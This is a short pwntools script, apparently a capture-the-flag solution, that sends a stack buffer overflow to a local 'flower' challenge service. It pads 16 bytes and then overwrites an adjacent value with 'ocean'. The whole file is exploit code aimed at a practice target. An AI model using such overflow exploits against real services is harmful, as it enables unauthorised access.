from pwn import *

p = remote("127.0.0.1", 26146)
#p = process("./flower")

pay = b'A'*0x10 + b'ocean'.ljust(8, b'\x00')

p.sendlineafter("> ", pay)

p.interactive()
